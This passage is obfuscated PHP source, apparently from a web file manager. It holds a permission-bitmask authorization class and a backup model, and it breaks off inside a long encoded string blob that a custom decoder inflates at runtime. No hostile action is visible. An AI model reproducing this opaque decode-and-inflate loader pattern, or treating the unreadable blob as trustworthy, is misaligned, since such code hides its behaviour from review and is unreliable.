$_SERVER[¹Éµ„ºå]; $²îùÍÇ‹ = array(array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2172]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2174], $´Ê¥×Ñ[2175] => 1, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2178]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2179], $´Ê¥×Ñ[2175] => 2, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2180]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2181], $´Ê¥×Ñ[2175] => 3, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2182]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2183], $´Ê¥×Ñ[2175] => 4, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => self::AUTH_SHOW | self::AUTH_VIEW), array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2184]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2185], $´Ê¥×Ñ[2175] => 5, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2186]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2187], $´Ê¥×Ñ[2175] => 6, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($´Ê¥×Ñ[509] => LNG($´Ê¥×Ñ[2188]), $´Ê¥×Ñ[2173] => $´Ê¥×Ñ[2189], $´Ê¥×Ñ[2175] => 7, $´Ê¥×Ñ[2176] => 1, $´Ê¥×Ñ[2177] => 0)); return $²îùÍÇ‹; } public static function authCheck($ôŸŒÓÖ, $¸£ª™±, $® Ï—ĞÂ = true) { $šµŒ¼ÚÇ =& $_SERVER[¹Éµ„ºå]; $ôŸŒÓÖ = intval($ôŸŒÓÖ); if ($® Ï—ĞÂ) { if (KodUser::isRoot() && $GLOBALS[$šµŒ¼ÚÇ[6]][$šµŒ¼ÚÇ[2190]]) { return !0; } } if ($ôŸŒÓÖ <= 0) { return !1; } if (($ôŸŒÓÖ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ôŸŒÓÖ & $¸£ª™±); } public static function authCheckShow($ºŸ¡šæÈ) { return self::authCheck($ºŸ¡šæÈ, self::AUTH_SHOW); } public static function authCheckView($É£üª¬) { return self::authCheck($É£üª¬, self::AUTH_VIEW); } public static function authCheckDownload($î‰®Æª) { return self::authCheck($î‰®Æª, self::AUTH_DOWNLOAD); } public static function authCheckUpload($®øƒŸ­) { return self::authCheck($®øƒŸ­, self::AUTH_UPLOAD); } public static function authCheckEdit($ÂÒã¯Òª) { return self::authCheck($ÂÒã¯Òª, self::AUTH_EDIT); } public static function authCheckRemove($î…êÜ‡ò) { return self::authCheck($î…êÜ‡ò, self::AUTH_REMOVE); } public static function authCheckShare($Àô·çş“) { return self::authCheck($Àô·çş“, self::AUTH_SHARE); } public static function authCheckComment($©À£÷â) { return self::authCheck($©À£÷â, self::AUTH_COMMENT); } public static function authCheckEvent($–×Š£Èó) { return self::authCheck($–×Š£Èó, self::AUTH_EVENT); } public static function authCheckRoot($åªó¸Ğ˜) { return self::authCheck($åªó¸Ğ˜, self::AUTH_ROOT); } public static function authCheckAction($Ú¾•ÜšÏ, $Û‚ş…Î£) { $Ô—‚²Ó =& $_SERVER[¹Éµ„ºå]; $ˆÂÉ°ş = array($Ô—‚²Ó[1549] => self::AUTH_SHOW, $Ô—‚²Ó[1550] => self::AUTH_VIEW, $Ô—‚²Ó[1374] => self::AUTH_DOWNLOAD, $Ô—‚²Ó[107] => self::AUTH_UPLOAD, $Ô—‚²Ó[1551] => self::AUTH_EDIT, $Ô—‚²Ó[1323] => self::AUTH_REMOVE, $Ô—‚²Ó[1552] => self::AUTH_SHARE, $Ô—‚²Ó[429] => self::AUTH_COMMENT, $Ô—‚²Ó[1553] => self::AUTH_EVENT, $Ô—‚²Ó[1554] => self::AUTH_ROOT); if (!isset($ˆÂÉ°ş[$Û‚ş…Î£])) { return; } $À­¦œÖæ = $ˆÂÉ°ş[$Û‚ş…Î£]; $Ú¾•ÜšÏ = intval($Ú¾•ÜšÏ); if ($Ú¾•ÜšÏ <= 0) { return !1; } if (($Ú¾•ÜšÏ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ú¾•ÜšÏ & $À­¦œÖæ); } public static function authDisable($ÃãÎŒÜë, $ù¼ÁÈÏí) { if (intval($ÃãÎŒÜë) <= 0) { return 0; } return intval($ÃãÎŒÜë) & ~$ù¼ÁÈÏí; } public $optionType = "\123\x79\x73\164\x65\155\56\x73\x6f\165\x72\143\145\x41\x75\164\150\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\x75\x74\150", "\154\x61\142\145\x6c", "\144\151\163\160\x6c\x61\171", "\x73\171\163\x74\x65\155", "\x73\157\162\164"); public function initData() { $Áº×üÔÖ = $this->authDefault(); foreach ($Áº×üÔÖ as $µµĞÒæÙ) { $this->add($µµĞÒæÙ); } } public function findAuth($ãöê–Ø, $¼‘‚³Œı) { $ŞØÊ˜ =& $_SERVER[¹Éµ„ºå]; $ŞÊú© = parent::listData(); foreach ($ŞÊú© as $—×¤¸Šƒ) { $¯”ê¸º = intval($—×¤¸Šƒ[$ŞØÊ˜[502]]); if ($¯”ê¸º <= 0 || $—×¤¸Šƒ[$ŞØÊ˜[2191]] == 0) { continue; } if (($¯”ê¸º & $ãöê–Ø) != $ãöê–Ø) { continue; } if (($¯”ê¸º & $¼‘‚³Œı) != 0) { continue; } return $—×¤¸Šƒ[$ŞØÊ˜[487]]; } return !1; } public function findAuthMax($Èíš÷Ò, $ÜÉÎšÀ¾) { $Üõ ‹Ôâ =& $_SERVER[¹Éµ„ºå]; $â–°®™ë = !1; $–·ıïÍé = parent::listData(); foreach ($–·ıïÍé as $²È–…µË) { $´˜õ¡íô = intval($²È–…µË[$Üõ ‹Ôâ[502]]); if ($´˜õ¡íô <= 0 || $²È–…µË[$Üõ ‹Ôâ[2191]] == 0) { continue; } if (($´˜õ¡íô & $Èíš÷Ò) != $Èíš÷Ò) { continue; } if (($´˜õ¡íô & $ÜÉÎšÀ¾) != 0) { continue; } if (!$â–°®™ë) { $â–°®™ë = $²È–…µË; continue; } if (intval($â–°®™ë[$Üõ ‹Ôâ[502]]) < $´˜õ¡íô) { $â–°®™ë = $²È–…µË; } } return $â–°®™ë ? $â–°®™ë[$Üõ ‹Ôâ[487]] : !1; } public function findAuthReadOnly() { $¡ª†ÖšÒ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÖÓâŠÑƒ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¡ª†ÖšÒ, $ÖÓâŠÑƒ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ğ“†ØªÚ =& $_SERVER[¹Éµ„ºå]; $ñ¹ÎÚó = parent::listData(); $¸˜ŞæÎô = !1; foreach ($ñ¹ÎÚó as $İÎµ§Ş·) { if ($İÎµ§Ş·[$ğ“†ØªÚ[502]] <= 0 || $İÎµ§Ş·[$ğ“†ØªÚ[2191]] == $ğ“†ØªÚ[228]) { continue; } if (!$¸˜ŞæÎô) { $¸˜ŞæÎô = $İÎµ§Ş·; continue; } if ($¸˜ŞæÎô[$ğ“†ØªÚ[502]] > $İÎµ§Ş·[$ğ“†ØªÚ[502]]) { $¸˜ŞæÎô = $İÎµ§Ş·; } } return $¸˜ŞæÎô ? $¸˜ŞæÎô[$ğ“†ØªÚ[487]] : $ğ“†ØªÚ[12]; } public function listData($Üò†ØŒ‘ = false, $«Û£øÁ = "\163\x6f\162\164", $§Ñ—üï = false) { return parent::listData($Üò†ØŒ‘, $«Û£øÁ, $§Ñ—üï); } public function update($›ë‡®¥, $×”˜è—¨) { $êšŸ¨õØ =& $_SERVER[¹Éµ„ºå]; $ÔÄ†ë¯œ = parent::listData($›ë‡®¥); $Ã¯Ü¼òÙ = $this->findByName($×”˜è—¨[$êšŸ¨õØ[32]]); if (!$ÔÄ†ë¯œ || $Ã¯Ü¼òÙ && $Ã¯Ü¼òÙ[$êšŸ¨õØ[487]] != $ÔÄ†ë¯œ[$êšŸ¨õØ[487]]) { return !1; } $this->filterAuth($×”˜è—¨[$êšŸ¨õØ[502]]); return parent::update($›ë‡®¥, $×”˜è—¨); } public function remove($à…«Ş¤Ø) { $•šß° = parent::listData($à…«Ş¤Ø); if (!$•šß° || $•šß°[$_SERVER[¹Éµ„ºå][189]]) { return !1; } return parent::remove($à…«Ş¤Ø); } public function add($™ı¿çÍÌ = array()) { $ññ‘”ïÆ =& $_SERVER[¹Éµ„ºå]; if ($this->findByName($™ı¿çÍÌ[$ññ‘”ïÆ[32]])) { return !1; } $¬ğ©³ƒÁ = array($ññ‘”ïÆ[32] => $ññ‘”ïÆ[12], $ññ‘”ïÆ[502] => 1, $ññ‘”ïÆ[2192] => $ññ‘”ïÆ[2181], $ññ‘”ïÆ[2191] => 1, $ññ‘”ïÆ[189] => 0, $ññ‘”ïÆ[2193] => 0); $™ı¿çÍÌ = array_merge($¬ğ©³ƒÁ, $™ı¿çÍÌ); $™ı¿çÍÌ[$ññ‘”ïÆ[2193]] = $this->getSort(); $this->filterAuth($™ı¿çÍÌ[$ññ‘”ïÆ[502]]); return parent::insert($™ı¿çÍÌ); } private function getSort() { $Á×êØ™Í =& $_SERVER[¹Éµ„ºå]; $ñ¨È¬† = parent::listData(); $‡Õ…ŠÅ« = array_to_keyvalue($ñ¨È¬†, $Á×êØ™Í[12], $Á×êØ™Í[2193]); return empty($‡Õ…ŠÅ«) ? 0 : max($‡Õ…ŠÅ«) + 1; } private function filterAuth(&$µáÉÑÑØ) { if (!$µáÉÑÑØ) { return; } $ÕÃÙìâ£ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÏÖ÷Åİ¿ = array(); foreach ($ÕÃÙìâ£ as $À˜†âœ) { if ($µáÉÑÑØ & $À˜†âœ) { $ÏÖ÷Åİ¿[] = $À˜†âœ; } } if (in_array(self::AUTH_ROOT, $ÏÖ÷Åİ¿)) { $µáÉÑÑØ = array_sum($ÕÃÙìâ£); return; } $Õ¥ëŸí‡ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÏÖ÷Åİ¿ as $À˜†âœ) { if (isset($Õ¥ëŸí‡[$À˜†âœ])) { $ÏÖ÷Åİ¿ = array_merge($ÏÖ÷Åİ¿, $Õ¥ëŸí‡[$À˜†âœ]); } } $ÏÖ÷Åİ¿[] = self::AUTH_SHOW; $µáÉÑÑØ = array_sum(array_unique($ÏÖ÷Åİ¿)); } public function sort($ş§÷à˜¤, $—öºŞæµ) { return parent::update($ş§÷à˜¤, $—öºŞæµ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\142\141\143\153\165\160\114\151\163\164"; public $field = array("\x69\x6f", "\x6e\x61\155\x65", "\x73\x74\141\x74\x75\163", "\x63\x6f\156\x74\145\x6e\164", "\x6d\x61\156\x75\141\x6c", "\162\x65\x73\x75\x6c\x74", "\164\151\155\145\x46\x72\x6f\x6d", "\x74\x69\x6d\x65\124\157"); public $autoTask = "\141\144\x6d\151\156\x2e\x62\x61\143\153\x75\x70\x2e\141\x75\x74\157\124\141\163\x6b"; public $fileTask = "\141\144\155\151\x6e\x2e\x62\141\x63\153\x75\x70\x2e\146\151\x6c\x65\x54\141\163\x6b"; public function config($ëò¶ŒäÆ = false) { $İ­×…Æ =& $_SERVER[¹Éµ„ºå]; $ê­ƒŒŒ¥ = $this->configSimple(); Action($İ­×…Æ[2194])->taskInit($ê­ƒŒŒ¥); if (!$ëò¶ŒäÆ) { return $ê­ƒŒŒ¥; } $¾œÚóüÊ = array(); if (Model($İ­×…Æ[864])->get($İ­×…Æ[2195], $İ­×…Æ[870]) == $İ­×…Æ[2196]) { Model($İ­×…Æ[1934])->cacheClear(); $¾œÚóüÊ = Model($İ­×…Æ[2197])->findByKey($İ­×…Æ[1553], $this->autoTask); if (!$¾œÚóüÊ) { $¾œÚóüÊ = array(); } if (isset($¾œÚóüÊ[$İ­×…Æ[204]])) { $¾œÚóüÊ[$İ­×…Æ[204]] = json_decode($¾œÚóüÊ[$İ­×…Æ[204]], !0); } if (isset($ê­ƒŒŒ¥[$İ­×…Æ[204]])) { $¾œÚóüÊ[$İ­×…Æ[204]][$İ­×…Æ[1938]] = $ê­ƒŒŒ¥[$İ­×…Æ[204]]; unset($ê­ƒŒŒ¥[$İ­×…Æ[204]]); } } $ê­ƒŒŒ¥ = array_merge($¾œÚóüÊ, $ê­ƒŒŒ¥); if ($ê­ƒŒŒ¥[$İ­×…Æ[168]] == $İ­×…Æ[935]) { $Šó»Ñ× = Model($İ­×…Æ[864])->get($İ­×…Æ[934], $İ­×…Æ[870]); $ê­ƒŒŒ¥[$İ­×…Æ[2198]] = json_decode($Šó»Ñ×, !0); } return $ê­ƒŒŒ¥; } public function configSimple() { $èÒØ–´Ä =& $_SERVER[¹Éµ„ºå]; $À¦§Ç¹Ê = Model($èÒØ–´Ä[864])->get($èÒØ–´Ä[870]); $À¦§Ç¹Ê = json_decode($À¦§Ç¹Ê, !0); if (!$À¦§Ç¹Ê) { $À¦§Ç¹Ê = array($èÒØ–´Ä[1935] => 0); } $À¦§Ç¹Ê[$èÒØ–´Ä[1935]] = _get($À¦§Ç¹Ê, $èÒØ–´Ä[1935], 1); $this->parseContent($À¦§Ç¹Ê); if ($À¦§Ç¹Ê[$èÒØ–´Ä[168]] == $èÒØ–´Ä[935] && Model($èÒØ–´Ä[864])->get($èÒØ–´Ä[952]) == $èÒØ–´Ä[953]) { $À¦§Ç¹Ê[$èÒØ–´Ä[168]] = $èÒØ–´Ä[1297]; } return $À¦§Ç¹Ê; } public function listData($¼ÓÂ‰ˆÌ = false, $“è½ƒç¿ = "\155\x6f\144\x69\x66\171\124\151\155\145", $®½Şª¼à = false) { $³¤²ßÂ = parent::listData($¼ÓÂ‰ˆÌ, $“è½ƒç¿, !0); if (!$³¤²ßÂ) { return $³¤²ßÂ; } if ($¼ÓÂ‰ˆÌ) { $³¤²ßÂ = array($³¤²ßÂ); } foreach ($³¤²ßÂ as &$ˆÕÊõŒÙ) { $this->parseContent($ˆÕÊõŒÙ); } return $¼ÓÂ‰ˆÌ ? $³¤²ßÂ[0] : $³¤²ßÂ; } public function parseContent(&$›Êİı½·) { $üÆ±áŸÓ =& $_SERVER[¹Éµ„ºå]; $í¢¸ë‹ƒ = _get($›Êİı½·, $üÆ±áŸÓ[168], $üÆ±áŸÓ[91]); if (!in_array($í¢¸ë‹ƒ, array($üÆ±áŸÓ[935], $üÆ±áŸÓ[1297]))) { $›Êİı½·[$üÆ±áŸÓ[168]] = $í¢¸ë‹ƒ == $üÆ±áŸÓ[91] ? $üÆ±áŸÓ[1297] : $üÆ±áŸÓ[935]; } } public function lastItem() { $ÎÓŠ»Àñ = $this->listData(); return !empty($ÎÓŠ»Àñ[0]) ? $ÎÓŠ»Àñ[0] : null; } public function kill($¨„¼¬Œ) { $èüÛş½Ï =& $_SERVER[¹Éµ„ºå]; $ËñÊà…Û = $this->listData($¨„¼¬Œ); if (!$ËñÊà…Û || empty($ËñÊà…Û[$èüÛş½Ï[32]])) { return !0; } Task::kill($èüÛş½Ï[877]); Task::kill($èüÛş½Ï[897]); Task::kill($èüÛş½Ï[908]); $èäËàĞ = $ËñÊà…Û[$èüÛş½Ï[32]]; $Ê Æù¨ = TEMP_FILES . $èüÛş½Ï[873] . $èäËàĞ . $èüÛş½Ï[8]; IO::remove($Ê Æù¨, !1); return $this->remove($¨„¼¬Œ); } public function remove($ÄéÌä) { $¤Êº£ßá = $this->listData($ÄéÌä); if (!$¤Êº£ßá) { return !0; } return $this->backupRemove($¤Êº£ßá); } private function backupRemove($Ë¥ã¹ã) { parent::remove($Ë¥ã¹ã[$_SERVER[¹Éµ„ºå][487]]); $˜äÈÏÀ• = $this->backupPath($Ë¥ã¹ã); IO::remove($˜äÈÏÀ•, !1); return !0; } private function backupPath($õÖ×ÃÙ) { $ÄÊ—îÂÙ =& $_SERVER[¹Éµ„ºå]; $Ô¬ûÕ§ƒ = $õÖ×ÃÙ[$ÄÊ—îÂÙ[32]]; $¤¿üâŒ = Model($ÄÊ—îÂÙ[864])->get($ÄÊ—îÂÙ[865]); $£èÎ‰¼‰ = substr(md5($ÄÊ—îÂÙ[866] . $¤¿üâŒ . $Ô¬ûÕ§ƒ), 0, 8); return "\173\x69\x6f\x3a{$õÖ×ÃÙ[$ÄÊ—îÂÙ[843]]}\x7d\57\x64\141\164\x61\142\141\x73\x65\x2f\142\x61\x63\153\165\x70\57" . $Ô¬ûÕ§ƒ . $ÄÊ—îÂÙ[11] . $£èÎ‰¼‰; } public function start($å•¸Å® = "\144\x62") { $·Ô¬×ø« =& $_SERVER[¹Éµ„ºå]; if ($GLOBALS[$·Ô¬×ø«[6]][$·Ô¬×ø«[92]][$·Ô¬×ø«[2199]] != $·Ô¬×ø«[91]) { return !0; } $âÒÖ¬ø– = $this->configSimple(); if (!$âÒÖ¬ø– || $âÒÖ¬ø–[$·Ô¬×ø«[1935]] != $·Ô¬×ø«[91]) { return !1; } if ($å•¸Å® == $·Ô¬×ø«[230]) { return $this->bakFile($âÒÖ¬ø–); } $´Èó€ë = $this->process(); foreach ($´Èó€ë as $²Öå¿«¼) { if ($²Öå¿«¼) { return Task::restart($²Öå¿«¼[$·Ô¬×ø«[487]]); } } $–ç¤»½Ø = new Backup(); if (!$–ç¤»½Ø || $–ç¤»½Ø->message) { return !1; } $ì÷”»Ô = $–ç¤»½Ø->db(); if ($ì÷”»Ô) { $ì÷”»Ô = $–ç¤»½Ø->dbFile(); if ($ì÷”»Ô && $âÒÖ¬ø–[$·Ô¬×ø«[168]] == $·Ô¬×ø«[935]) { $ì÷”»Ô = $–ç¤»½Ø->file(); } } Backup::set(array($·Ô¬×ø«[841] => 1, $·Ô¬×ø«[853] => time())); return !0; } public function process() { $°˜Ôº©½ =& $_SERVER[¹Éµ„ºå]; $ŞÑ²±Úî = array($°˜Ôº©½[849] => Task::get($°˜Ôº©½[877]), $°˜Ôº©½[854] => Task::get($°˜Ôº©½[897]), $°˜Ôº©½[230] => Task::get($°˜Ôº©½[908])); $¸õ‘ŠÇ¹ = !1; foreach ($ŞÑ²±Úî as &$ïñØûï³) { if ($¸õ‘ŠÇ¹) { $ïñØûï³ = !1; continue; } if ($ïñØûï³) { $Âøë†şú = intval(_get($ïñØûï³, $°˜Ôº©½[1969], 0)); if (time() - $Âøë†şú > 7200) { Task::kill($ïñØûï³[$°˜Ôº©½[487]]); $¸õ‘ŠÇ¹ = !0; $ïñØûï³ = !1; } } } return $ŞÑ²±Úî; } public function bakFile($ÜÅéá») { $éºˆ¤º =& $_SERVER[¹Éµ„ºå]; if ($ÜÅéá»[$éºˆ¤º[168]] == $éºˆ¤º[1297]) { return !1; } Model($éºˆ¤º[1934])->cacheClear(); $¯æã™êò = Model($éºˆ¤º[2197])->findByKey($éºˆ¤º[1553], $this->fileTask); if (!$¯æã™êò) { return !1; } $±ØøŠ‚ñ = json_decode($¯æã™êò[$éºˆ¤º[204]], !0); if (!$±ØøŠ‚ñ || $±ØøŠ‚ñ[$éºˆ¤º[33]] != $éºˆ¤º[1947]) { return !1; } $±ØøŠ‚ñ = intval($±ØøŠ‚ñ[$éºˆ¤º[1947]]); if ($±ØøŠ‚ñ <= 0) { return !1; } $Ó³¸ÀÕ = new BackupFile(!0); return $Ó³¸ÀÕ->start($ÜÅéá»[$éºˆ¤º[843]], $±ØøŠ‚ñ); } public function restore() { $¬ºù™®£ =& $_SERVER[¹Éµ„ºå]; ActionCall($¬ºù™®£[2200], !0, 1); ActionCall($¬ºù™®£[2200], !0, 0); } } goto C‘“•À‡·; eí°ĞÈõÁ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xb9\xc9\xb5\x84\xba\xe5", "\xb5\x91\xa6\xd8\xaa\x84"); $_SERVER[¹Éµ„ºå] = explode("\174\4\174\5\174\1", gzinflate(substr(_kodDe('KYAU9f319fX1CPWyunFuyhAlylPB4pVa+CIeVmIZJQirqyIwqHdmwCF9pg4hwz5id1gbYV4hQgle')."\xcd\xc8\x5b\x12\x4a\x59\xc2\x1a\x12\xc2\xbe\x5\x28\x4b\xe1\x69\x49\x58\x43\x20\x61\x69\x59\x5b\xf6\xc2\xc3\xde\xf6\x29\xc4\x4e\xd2\x6\x28\xa5\x74\x1\x4a\xbf\xbb\x9c\xbb\xcc\x48\x86\xf7\xfb\xbd\x7f\xbc\x81\x44\x77\x9f\xbb"."\234\173\316\271\347\236\163\356\23\277\272\365\212\273\76\133\175\300\352\3\127\357\373\360\215\327\275\176\301\172\32\136\275\77\371\45\341\343\57\72\170\37\362\347\310\213\56\254\251\151\233\171\350\324\350\267".base64_decode('1t9/l7ZZu1NbF4s893z42y/+4pTQ+C3PjYzvu8/e246e0ogK07qN9EfJm7aiDxuWbdGElJnvM/o=')."\151\330\310\323\137\77\375\351\214\107\212\172\316\264\165\32\365\321\37\25\372\105\376\265\126\146\15\226\257\106\143\111\65\321\331\321\21\212\47\241\120\243\234\237\63\323\20\52\150\105\55\7\337\57\350\105"."\xb\xf5\x46\x6e\x4e\x2d\x98\x5\x3d\xef\x48\x11\x9\x69\xcd\xd6\x7a\x35\xb\x5a\x6a\x69\x56\x5b\x42\x1d\x91\xd8\x32\x35\xb9\xac\x23\x4\x25\x7a\xd5\x95\x25\xbd\x38\x42\x63\x24\x98\xb0\xb5\xa2\x9d\x34\x72\x3a\x2f\x31\x54\xe4".base64_decode('/WoOLQxHlWQ8EE0EgslwLEqTg7H29nCyPD0ei0SaA8FF5Tkd8cDC9oCC+pfVVSPfZ9Yoy2nOcqU=')."\x96\x6\x5a\xd\x3d\x9b\xa6\xc1\xbc\xc6\xba\x63\x8f\x14\x20\x94\xe4\x21\xb4\x4c\xf9\x52\x36\x4b\x23\x51\x1e\x4a\xeb\x7d\x5a\x29\xb\xb3\xd5\x22\x47\xa\x45\x23\xa7\xb1\x41\x2f\xd2\x47\x78\x2a\xd\x68\x25\xdb\x34\xf2\x29\x1a"."\11\15\333\105\115\244\243\276\246\320\102\353\171\150\52\21\212\204\202\111\5\167\120\151\215\307\332\25\130\204\234\146\331\172\121\131\322\26\212\207\24\334\351\246\152\62\326\152\5\340\45\212\246\102\11\104".strrev('1â5µ¬HƒEã	àÀiÇŠº–ÒV‚µ¼ÌåÌÊPÌE2óJâ„·‹4*u¡šÀ®zØ-DÊ"')."\xdc\xa9\x11\xd4\x93\x69\x0\x9f\x8e\x58\xba\x2f\x6b\xab\x83\x5a\xb6\xc4\xc0\x74\x80\xfe\x56\xc3\xf\xfc\x9a\x16\x80\xee\x4a\x23\x6f\x94\x0\x4c\xa1\x9\xd3\xe4\xdb\xa\x2\x25\x56\x5a\x67\x29\x7a\x1a\x2\x39\x54\xdf\x84\x7a"."\275\220\326\313\112\255\140\1\3\355\320\101\32\154\232\117\177\347\102\375\136\25\347\351\105\133\325\363\51\63\155\344\141\37\57\0\170\324\354\114\113\321\100\5\150\274\317\314\246\131\330\62\106\141\224\175"."\106\126\217\226\162\162\21\36\115\145\214\154\272\310\266\336\127\225\244\321\10\337\311\270\254\210\25\120\117\70\22\60\372\106\304\126\304\345\72\170\256\145\226\212\51\75\214\266\16\215\327\103\262\156\333\150"."\x70\x6c\x42\xcc\xce\x42\xd6\xd4\xd2\x9\xbd\xc8\x87\x66\x98\xad\xa8\xa1\x58\xc9\x96\x13\x7\xd8\x2e\x48\x4b\x93\xd0\xd\x4d\x66\xf4\x6c\x56\xd5\x87\x75\xd8\x12\xb9\xf4\xc\x8b\x8d\xc5\x6f\xf5\x1a\x79\x3f\x4a\xa1\xd1\x70\x4c"."\315\150\126\246\75\75\103\45\265\30\256\114\353\303\276\102\246\0\373\225\157\321\156\7\310\342\221\107\115\73\44\141\334\254\231\322\240\154\211\14\204\206\63\266\135\110\350\371\64\36\10\164\333\34\312\223".base64_decode('gRZ0HQq1eJS00q4sU9oajUaLVcxleYiNjqdZPNEeZquR7gNgYwi/Cj5oWAR3iY2nFQpZI6XZhpk=')."\xf7\x9b\x29\x5b\xb7\xbd\x96\x5d\xd4\x35\x68\x31\x90\x4a\xe9\x96\xe5\xd\x9a\x79\xbb\x68\x66\xbd\x81\x6c\xd6\x1c\xf2\xc6\x8a\x46\xbf\x91\x6f\x54\xa6\x0\x1a\x45\x99\x68\xbb\x7a\x31\x6a\x6b\x84\x3d\x58\x35\x57\xc1\xeb\x8e\x3f"."\63\245\251\144\367\171\147\263\275\305\113\27\265\274\325\247\27\275\41\0\354\106\5\165\226\343\67\126\254\305\260\12\246\145\340\356\65\52\232\155\153\251\14\306\15\242\371\246\257\50\157\344\263\106\136\57"."\x2f\x8b\x1a\xd1\xbd\x1d\x45\xad\x3f\xa7\x35\x2a\x85\x52\x2f\x9a\x0\xd8\x4f\x90\x96\xc2\x25\xe4\xc2\x30\x1\x8d\x4a\x4e\x1b\xf6\x6a\xfd\xac\xa5\xd0\x70\xc1\x28\xea\x16\x1b\xb5\xb2\xb0\x3d\x9\x10\xd5\xe7\x6d\xc7\xfb\xc0\xd0"."\xd3\xde\x4\x42\xbe\xd0\xd8\xb4\xba\xe9\xa\x82\x15\x85\xe5\xd1\xd4\xb6\x64\xb2\x43\xd\xb7\x22\xea\x1a\xd\xa9\xed\x81\x64\xb0\xd\x5a\xb7\xb5\x7e\xd6\x74\x4\xa1\x54\xde\x24\x4b\x5c\xea\x45\xfb\x1\x43\x53\x14\xd\x4e\x24"."\x76\x98\x43\x7a\x11\x7d\xb8\x79\xa4\x51\x19\x30\xd3\xbd\xe6\xb0\x8f\x65\xe1\xc2\x9\x84\x18\x58\x61\xbc\xbe\x5\xdb\x1b\xd7\xf2\xfd\x78\x18\xbd\x23\xb6\x6e\xb9\x51\x4b\x33\xa2\xc5\xbe\x3e\xba\xf9\x7c\xbd\x7a\x9f\x59\x84\xd1"."\130\203\375\316\311\217\350\371\176\73\303\332\116\204\342\213\103\161\65\21\153\115\56\11\304\201\164\347\21\344\14\263\336\340\257\147\275\161\75\215\46\61\145\263\172\132\101\314\376\122\57\336\60\370\343\54".base64_decode('F28ilhcJL8Rz1+K1UCGvXIq1HTFyBh6ezXPIZCO6vhA65Cdjbuq2ptR0p6fWetG/U2q7ult8U3o=')."\26\370\15\121\307\137\357\253\127\32\352\146\52\35\210\321\60\264\254\2\203\56\53\121\247\304\26\71\247\105\100\170\336\314\353\25\67\26\2\44\323\322\275\155\272\206\160\54\132\10\307\272\170\330\267\150"."\374\53\146\27\223\72\11\227\270\326\205\46\306\103\247\166\206\22\111\265\75\224\154\213\265\100\367\103\1\10\345\121\145\322\137\266\306\230\257\2\252\226\207\146\365\141\211\4\10\124\236\222\47\204\324\213".base64_decode('mkMMebsAKJjRUwMT5KEQjMakeIktXRf96QFo7qE/qhqMhAJxFRhS1bBaJSqIoxzdqmbvCgRo7bo=').base64_decode('rYkBoM+Fc2hLi4GoTpLFRtkuAB/toCVGmtM0FG3Tjf4M9NvAzaXMrFnUspgUMDa03wCsXMiW0DY=')."\360\343\206\223\231\122\256\27\270\161\64\145\375\272\55\70\104\153\4\261\121\71\106\137\21\221\266\303\55\16\52\12\61\277\212\101\267\333\127\310\367\327\236\4\155\251\15\63\352\160\2\254\52\214\14\261".base64_decode('yiW9fOi+lIn2ebs2oDfisQBym0tSWUTCn3MxyWtyowm8WllfDjVC2gyanCDTw8hcJ8lT9GLRLJ4=')."\x0\x25\x48\x58\x21\x74\x13\x2f\x17\x34\x6e\x73\x26\xc2\x42\x18\x81\x85\x33\x26\x67\x3a\x4c\x6\x9b\x8d\x7e\